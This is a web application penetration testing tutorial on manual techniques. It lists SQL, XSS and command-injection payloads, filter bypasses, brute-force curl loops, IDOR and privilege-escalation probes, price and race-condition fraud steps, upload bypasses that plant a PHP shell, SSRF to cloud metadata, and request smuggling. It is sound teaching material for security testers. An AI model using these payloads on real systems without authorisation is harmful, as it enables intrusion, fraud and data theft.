# Manual Testing Techniques

Manual testing finds vulnerabilities that automated tools miss. It's about thinking like an attacker and systematically probing every aspect of an application. This is where security professionals separate themselves from script kiddies.

---

## Why Manual Testing Matters

**Automated tools miss context** - They can't understand business logic or chain vulnerabilities together.

**Every app is unique** - Cookie-cutter attacks don't work on custom applications with unique workflows.

**Critical vulnerabilities are often logical** - Race conditions, business logic flaws, and complex authentication bypasses require human thinking.

---

## Systematic Input Testing

### Finding All Input Points

**Obvious inputs:** Forms, URL parameters, search boxes
**Hidden inputs:** HTTP headers, cookies, file uploads, API parameters

**Complete input discovery:**
```bash
# Test every parameter you find
GET /search?q=test&category=books&sort=date
# Test: q, category, sort

POST /profile
username=test&email=test@example.com&role=user  
# Test: username, email, role (especially role!)
```

### Universal Injection Payloads

**Why these payloads work:** They trigger errors or unexpected behavior in most applications.

```
# SQL Injection detection
'
"
' OR '1'='1
'; DROP TABLE users;--

# XSS detection  
<script>alert(1)</script>
'"><script>alert(1)</script>

# Command Injection detection
; ls
| whoami
`pwd`
$(id)
```

### Filter Bypass Techniques

**When basic payloads fail, try encoding and obfuscation:**

**SQL Injection bypasses:**
```
# Space filtering
SELECT/**/username/**/FROM/**/users
SELECT+username+FROM+users

# Keyword filtering
seLEct (mixed case)
CHAR(83)+CHAR(69)+CHAR(76) (character encoding)
```

**XSS bypasses:**
```
# When <script> is blocked
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
```

---

## Authentication Testing

### Understanding Authentication Flows

**Map the complete process:**
1. Login form submission
2. Session creation mechanism
3. Session validation on subsequent requests
4. Password reset functionality
5. Account lockout behavior

### Common Authentication Flaws

**Username enumeration:**
```
# Different error messages reveal valid usernames
Valid user: "Invalid password for john"
Invalid user: "User not found"
```

**Weak password policies:** Test with passwords like: admin, password, 123456, company_name123

**Missing rate limiting:**
```bash
# Brute force without delays
for i in {1..1000}; do
  curl -X POST /login -d "username=admin&password=pass$i"
done
```

### Advanced Authentication Attacks

**Session fixation test:**
1. Get session ID before logging in
2. Force victim to use that session ID  
3. Victim logs in (session is now authenticated)
4. Attacker uses the authenticated session

**Multi-factor bypass:**
- Try accessing protected resources directly after entering username/password (before MFA step)
- Test if backup codes have different validation logic
- Check for race conditions in code verification

---

## Authorization Testing (The Big One)

### Horizontal Privilege Escalation (User A accessing User B's data)

**Direct object reference testing:**
```
# Your profile
GET /profile?user_id=123

# Try other user IDs
GET /profile?user_id=124
GET /profile?user_id=125

# Try encoded values
GET /profile?user_id=MTI0 (base64 "124")
GET /profile?user_id=7c (hex "124")
```

### Vertical Privilege Escalation (User becoming Admin)

**Function-level access control:**
```
# Try admin functions as regular user
GET /admin/users
POST /admin/delete_user
PUT /admin/change_role

# Test different HTTP methods
GET /admin/users (blocked)
POST /admin/users (allowed?)
```

**Parameter pollution:**
```
# Try adding privilege parameters
Original: user_id=123
Test: user_id=123&role=admin
Test: user_id=123&is_admin=true
```

---

## Business Logic Testing

### E-commerce Logic Flaws

**Price manipulation:**
```
1. Add expensive item ($1000) to cart
2. Intercept checkout request
3. Change price to $1 in request
4. Complete purchase
```

**Quantity manipulation:**
```
# Negative quantities might credit money
quantity=-1 (system might pay you instead of charging)
```

**Discount stacking:**
```
# Apply multiple discount codes
coupon1=SAVE50&coupon2=STUDENT20&coupon3=FIRSTTIME10
# Some systems don't prevent multiple discounts
```

### Workflow Manipulation

**Registration bypass:**
```
1. Start premium account registration
2. Abandon at payment step
3. Check if account was created with premium features
```

**Race conditions:**
```
# Send multiple requests simultaneously
# Example: Transfer money multiple times before balance check
curl -X POST /transfer -d "amount=100&to=attacker" &
curl -X POST /transfer -d "amount=100&to=attacker" &
curl -X POST /transfer -d "amount=100&to=attacker" &
```

---

## File Upload Testing

### Bypassing File Type Restrictions

**Extension manipulation:**
```
# Double extensions
malicious.php.jpg
malicious.jpeg.php

# Null byte injection  
malicious.php%00.jpg

# Case variations
malicious.PHP
malicious.pHp
```

**MIME type bypasses:**
```
# Upload PHP file with image MIME type
Content-Type: image/jpeg
(for a .php file)
```

### Path Traversal in Uploads

**Filename manipulation:**
```
# Try to write outside web directory
../../../var/www/shell.php
..%2f..%2f..%2fvar%2fwww%2fshell.php (URL encoded)
```

---

## Advanced Attack Techniques

### Server-Side Request Forgery (SSRF)

**Internal network scanning:**
```
# URL parameters that make server requests
url=http://192.168.1.1:8080
callback=http://localhost:3306
webhook=http://169.254.169.254/ (cloud metadata)
```

### HTTP Request Smuggling

**Why it works:** Frontend and backend servers disagree about request boundaries.

**Basic test:**
```
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### Cache Poisoning

**Web cache deception:**
```
# Request: /profile/user123.css
# Cache stores as CSS file but server processes as profile page
# Attacker can later access cached sensitive data
```

---

## Testing Methodology

### Phase 1: Reconnaissance
- Map all functionality (every button, form, API endpoint)
- Identify technology stack
- Understand user roles and permissions
- Note any unusual or custom features

### Phase 2: Input Validation
- Test every input with universal payloads
- Focus on areas that interact with databases or system commands
- Check file upload functionality thoroughly
- Test API endpoints if present

### Phase 3: Authentication & Authorization
- Test login mechanisms for bypass opportunities
- Check session management implementation
- Test user role separation (horizontal and vertical privilege escalation)
- Verify password reset and account recovery flows

### Phase 4: Business Logic
- Understand intended workflows
- Test for logical flaws in multi-step processes
- Look for race conditions in financial or critical operations
- Test edge cases and unexpected user behavior

---

## Essential Tools for Manual Testing

### Browser Developer Tools
**Network tab:** See all requests, modify and resend
**Console:** Execute JavaScript for XSS testing
**Application tab:** Examine cookies and local storage

### Command Line
```bash
# cURL for manual request crafting
curl -X POST /login -d "username=admin&password=test" -v

# Netcat for raw TCP connections
nc target.com 80
```

### Burp Suite Integration
- Use Repeater for iterative manual testing
- Intruder for systematic parameter testing
- Proxy for request/response modification

---

## Learning Resources

### Methodology Guides
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/ - Comprehensive testing methodology
- **PTES**: http://www.pentest-standard.org/ - Professional testing standards

### Practice Platforms
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security - Interactive labs with guided learning
- **OWASP WebGoat**: https://owasp.org/www-project-webgoat/ - Hands-on vulnerable application
- **Damn Vulnerable Web App**: https://github.com/digininja/DVWA - Classic practice target

### Advanced Techniques
- **Web Application Hacker's Handbook**: The definitive manual testing reference
- **Bug Bounty Reports**: https://hackerone.com/hacktivity - Real-world vulnerability examples